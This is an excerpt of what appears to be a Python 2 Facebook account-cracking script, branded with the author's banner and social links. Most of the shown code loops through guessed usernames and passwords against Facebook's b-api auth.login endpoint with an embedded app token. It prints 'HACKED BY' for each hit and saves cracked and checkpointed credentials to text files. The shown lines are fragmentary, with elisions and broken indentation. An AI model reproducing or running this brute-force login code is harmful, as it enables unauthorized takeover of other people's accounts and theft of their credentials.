...
\033[1;90m [ NAM TU MERA NH SUNA HOGA ]

\x1b[1;92m=============================
\x1b[1;93m Coder + Author  : SK
\x1b[1;93m GIT HUB : FOLLOW ME
\x1b[1;93m FaceBook : Amanullah Dhiilon
\x1b[1;93m You Tube : AMANU SK 
\x1b[1;92m=============================
\x1b[1;93m     ➾       NOTE !
\x1b[1;91m=======================================
\x1b[1;93m     ➾ DoNT COPY MY STYLE 
\x1b[1;91m======================================= '''                                                                                                                                                                                                                                                                                                                                                  

CorrectUsername = "Amanu"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:Amanu Sk
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/amanullah.dhillon.92
    else:
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;92m         [ Amanu SK { NAM TU NH SUNA HUGA } ]"
	print
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m[ Ok =HACKED BY AMANU SK ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;95mAmanu \x1b[1;95m[iD iZ CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
					...
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;92m[ Ok =HACKED BY AMANU SK ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						...
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;95mAmanu \x1b[1;95m[iD iZ CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							...
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[ Ok =HACKED BY AMANU SK ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
								okb = open('save/successfull.txt', 'a')
								...
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;95mAmanu \x1b[1;95m[iD iZ CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
